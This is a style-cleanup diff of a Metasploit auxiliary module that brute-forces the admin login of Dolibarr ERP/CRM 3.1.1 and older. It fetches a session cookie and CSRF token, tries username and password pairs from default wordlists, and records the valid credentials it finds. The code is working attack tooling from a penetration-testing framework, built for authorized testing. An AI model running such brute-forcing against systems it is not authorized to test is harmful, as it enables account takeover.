@@ -10,45 +10,54 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Dolibarr ERP/CRM Login Utility',
-      'Description'    => %q{
-        This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
-        and should only work against version 3.1.1 or older, because these versions do not
-        have any default protections against brute forcing.
-      },
-      'Author'         => [ 'sinn3r' ],
-      'License'        => MSF_LICENSE
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Dolibarr ERP/CRM Login Utility',
+        'Description' => %q{
+          This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,
+          and should only work against version 3.1.1 or older, because these versions do not
+          have any default protections against brute forcing.
+        },
+        'Author' => [ 'sinn3r' ],
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
-        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
-        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
-        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
+        OptPath.new('USERPASS_FILE', [
+          false, 'File containing users and passwords separated by space, one pair per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_userpass.txt')
+        ]),
+        OptPath.new('USER_FILE', [
+          false, 'File containing users, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_users.txt')
+        ]),
+        OptPath.new('PASS_FILE', [
+          false, 'File containing passwords, one per line',
+          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')
+        ]),
         OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])
-      ])
+      ]
+    )
   end
-
 
   def get_sid_token
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => normalize_uri(@uri)
+      'uri' => normalize_uri(@uri)
     })
 
     return [nil, nil] if res.nil? || res.get_cookies.empty?
 
     # Get the session ID from the cookie
     m = res.get_cookies.match(/(DOLSESSID_.+);/)
-    id = (m.nil?) ? nil : m[1]
+    id = m.nil? ? nil : m[1]
 
     # Get the token from the decompressed HTTP body response
     m = res.body.match(/type="hidden" name="token" value="(.+)"/)
-    token = (m.nil?) ? nil : m[1]
+    token = m.nil? ? nil : m[1]
 
     return id, token
   end
@@ -86,8 +95,8 @@ class MetasploitModule < Msf::Auxiliary
     # we won't get a false positive due to reusing the same sid/token.
     #
     sid, token = get_sid_token
-    if sid.nil? or token.nil?
-      vprint_error("Unable to obtain session ID or token, cannot continue")
+    if sid.nil? || token.nil?
+      vprint_error('Unable to obtain session ID or token, cannot continue')
       return :abort
     else
       vprint_status("Using sessiond ID: #{sid}")
@@ -96,32 +105,32 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi({
-        'method'   => 'POST',
-        'uri'      => normalize_uri("#{@uri}index.php"),
-        'cookie'   => sid,
+        'method' => 'POST',
+        'uri' => normalize_uri("#{@uri}index.php"),
+        'cookie' => sid,
         'vars_post' => {
-          'token'         => token,
+          'token' => token,
           'loginfunction' => 'loginfunction',
-          'tz'            => '-6',
-          'dst'           => '1',
-          'screenwidth'   => '1093',
-          'screenheight'  => '842',
-          'username'      => user,
-          'password'      => pass
+          'tz' => '-6',
+          'dst' => '1',
+          'screenwidth' => '1093',
+          'screenheight' => '842',
+          'username' => user,
+          'password' => pass
         }
       })
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
-      vprint_error("Service failed to respond")
+      vprint_error('Service failed to respond')
       return :abort
     end
 
     if res.nil?
-      vprint_error("Connection timed out")
+      vprint_error('Connection timed out')
       return :abort
     end
 
     location = res.headers['Location']
-    if res and res.headers and (location = res.headers['Location']) and location =~ /admin\//
+    if res && res.headers && (location = res.headers['Location']) && location =~ (%r{admin/})
       print_good("Successful login: \"#{user}:#{pass}\"")
       report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.headers['Location'])
       return :next_user
@@ -133,15 +142,15 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @uri = target_uri.path
-    @uri << "/" if @uri[-1, 1] != "/"
+    @uri << '/' if @uri[-1, 1] != '/'
 
     super
   end
 
-  def run_host(ip)
-    each_user_pass { |user, pass|
+  def run_host(_ip)
+    each_user_pass do |user, pass|
       vprint_status("Trying \"#{user}:#{pass}\"")
       do_login(user, pass)
-    }
+    end
   end
 end
